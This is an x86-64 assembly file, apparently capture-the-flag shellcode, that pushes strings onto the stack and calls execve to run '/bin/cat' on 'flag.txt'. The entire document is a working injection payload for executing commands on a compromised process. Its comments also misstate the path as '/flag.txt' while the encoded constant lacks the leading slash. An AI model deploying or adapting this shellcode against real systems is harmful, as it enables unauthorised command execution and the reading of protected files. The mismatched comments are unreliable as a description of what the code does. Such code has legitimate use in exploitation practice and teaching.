global _start

section .text

_start:
    xor rax, rax            ; Clear rax register

    ; Push null-terminated string "/flag.txt" in reverse
    push rax                ; null terminator for the string
    mov rdx, 0x7478742e67616c66 ; "flag.txt" in hex, little endian
    push rdx                ; Push "flag.txt" onto the stack
    mov rdx, rsp            ; rdx now points to the string "flag.txt"

    ; Push null-terminated string "/bin/cat" in reverse
    push rax                ; null terminator for the string
    mov rdi, 0x7461632f6e69622f ; "/bin/cat" in hex, little endian
    push rdi                ; Push "/bin/cat" onto the stack
    mov rdi, rsp            ; rdi now points to the string "/bin/cat"

    ; Set up the argv array for execve: {"/bin/cat", "/flag.txt", null}
    push rax                ; null terminator for the array
    push rdx                ; Pointer to "/flag.txt"
    push rdi                ; Pointer to "/bin/cat"
    mov rsi, rsp            ; rsi now points to the array of pointers

    ; Make the execve syscall
    xor rdx, rdx            ; envp (environment pointer) is null
    mov al, 59              ; execve syscall number
    syscall                 ; Invoke the syscall
